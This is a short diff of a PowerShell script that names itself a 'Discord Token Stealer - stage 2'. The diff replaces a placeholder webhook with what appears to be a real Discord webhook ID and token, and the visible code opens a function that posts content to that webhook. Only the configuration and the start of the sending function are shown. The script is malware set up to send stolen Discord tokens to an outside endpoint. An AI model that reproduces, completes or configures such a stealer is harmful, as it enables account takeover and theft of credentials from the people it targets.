@@ -1,7 +1,7 @@
 # Discord Token Stealer - stage 2
 # Replace WEBHOOK with your Discord webhook
 
-$Webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
+$Webhook = "https://discord.com/api/webhooks/1543999798452027435/OIcVXPK_yS0I4Fe5svBxlkzw2_yNDzJcdX5CKEsv-wP0KRgQlS1GXpDyAK2JitSYJ13V"
 
 function Send-Discord($content) {
     try {
